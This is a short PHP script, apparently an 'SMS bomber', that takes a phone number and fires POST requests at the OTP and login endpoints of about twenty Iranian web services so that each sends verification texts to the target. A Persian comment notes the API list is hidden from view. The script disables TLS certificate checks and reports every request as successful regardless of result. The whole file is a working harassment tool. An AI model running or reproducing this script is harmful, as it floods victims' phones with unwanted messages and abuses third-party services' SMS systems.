<?php
$data = json_decode($argv[1], true);
$phone = $data['phone'] ?? '';
$mode = intval($data['mode'] ?? 10);

// API های ارسال پیامک - اینجا کسی نمیبینه
$services = [
    ['name' => 'دیوار', 'url' => 'https://api.divar.ir/v5/auth/authenticate', 'body' => json_encode(['phone' => $phone]), 'headers' => ['Content-Type: application/json']],
    ['name' => 'اسنپ', 'url' => 'https://api.snapp.express/mobile/v4/user/loginMobileWithNoPass', 'body' => 'cellphone=' . $phone, 'headers' => []],
    ['name' => 'آزکی', 'url' => 'https://www.azki.com/api/vehicleorder/v2/app/auth/check-login-availability/', 'body' => json_encode(['phoneNumber' => $phone]), 'headers' => ['Content-Type: application/json', 'deviceid: 6']],
    ['name' => 'تپسی', 'url' => 'https://api.tapsi.ir/api/v2.2/user', 'body' => json_encode(['credential' => ['phoneNumber' => $phone, 'role' => 'PASSENGER'], 'otpOption' => 'SMS']), 'headers' => ['Content-Type: application/json']],
    ['name' => 'اوستاکار', 'url' => 'https://api.ostadkr.com/login', 'body' => json_encode(['mobile' => $phone]), 'headers' => ['Content-Type: application/json']],
    ['name' => 'بانی مد', 'url' => 'https://mobapi.banimode.com/api/v2/auth/request', 'body' => json_encode(['phone' => $phone]), 'headers' => ['Content-Type: application/json']],
    ['name' => 'طاقچه', 'url' => 'https://gw.taaghche.com/v4/site/auth/login', 'body' => json_encode(['contact' => $phone, 'forceOtp' => false]), 'headers' => ['Content-Type: application/json']],
    ['name' => 'جاباما', 'url' => 'https://taraazws.jabama.com/api/v4/account/send-code', 'body' => json_encode(['mobile' => $phone]), 'headers' => ['Content-Type: application/json']],
    ['name' => 'علی بابا', 'url' => 'https://ws.alibaba.ir/api/v3/account/mobile/otp', 'body' => json_encode(['phoneNumber' => $phone]), 'headers' => ['Content-Type: application/json']],
    ['name' => 'شهرفرش', 'url' => 'https://shahrfarsh.com/Account/Login', 'body' => 'phoneNumber=' . $phone, 'headers' => ['Content-Type: application/x-www-form-urlencoded']],
    ['name' => 'قبضینو', 'url' => 'https://application2.billingsystem.ayantech.ir/WebServices/Core.svc/requestActivationCode', 'body' => json_encode(['Parameters' => ['MobileNumber' => $phone]]), 'headers' => ['Content-Type: application/json']],
    ['name' => 'واندار', 'url' => 'https://api.vandar.io/account/v1/check/mobile', 'body' => json_encode(['mobile' => $phone]), 'headers' => ['Content-Type: application/json']],
    ['name' => 'پینورست', 'url' => 'https://api.pinorest.com/frontend/auth/login/mobile', 'body' => json_encode(['mobile' => $phone]), 'headers' => ['Content-Type: application/json']],
    ['name' => 'تترلند', 'url' => 'https://service.tetherland.com/api/v5/login-register', 'body' => json_encode(['mobile' => $phone]), 'headers' => ['Content-Type: application/json']],
    ['name' => 'دکتردکتر', 'url' => 'https://drdr.ir/api/v3/auth/login/mobile/init', 'body' => json_encode(['mobile' => $phone]), 'headers' => ['Content-Type: application/json', 'client-id: f60d5037-b7ac-404a-9e3a-a263fd9f8054']],
    ['name' => 'کلاسینو', 'url' => 'https://student.classino.com/otp/v1/api/login', 'body' => json_encode(['mobile' => $phone]), 'headers' => ['Content-Type: application/json']],
    ['name' => 'موبیت', 'url' => 'https://api.mobit.ir/api/web/v8/register/register', 'body' => json_encode(['number' => $phone]), 'headers' => ['Content-Type: application/json']],
    ['name' => 'کمدا', 'url' => 'https://api.komodaa.com/api/v2.6/loginRC/request', 'body' => json_encode(['phone_number' => $phone]), 'headers' => ['Content-Type: application/json']],
    ['name' => 'برق من', 'url' => 'https://uiapi2.saapa.ir/api/otp/sendCode', 'body' => json_encode(['mobile' => $phone]), 'headers' => ['Content-Type: application/json']],
    ['name' => 'نوبت دِه', 'url' => 'https://nobat.ir/api/public/patient/login/phone', 'body' => 'mobile=' . $phone, 'headers' => ['Content-Type: application/x-www-form-urlencoded']],
];

$count = min($mode, count($services));
$results = [];

for ($i = 0; $i < $count; $i++) {
    $s = $services[$i];
    $ch = curl_init($s['url']);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $s['body']);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    if (!empty($s['headers'])) {
        curl_setopt($ch, CURLOPT_HTTPHEADER, $s['headers']);
    }
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    curl_exec($ch);
    curl_close($ch);
    $results[] = ['name' => $s['name'], 'status' => 'success'];
    usleep(600000);
}

echo json_encode(['success' => true, 'results' => $results, 'total' => $count]);
?>
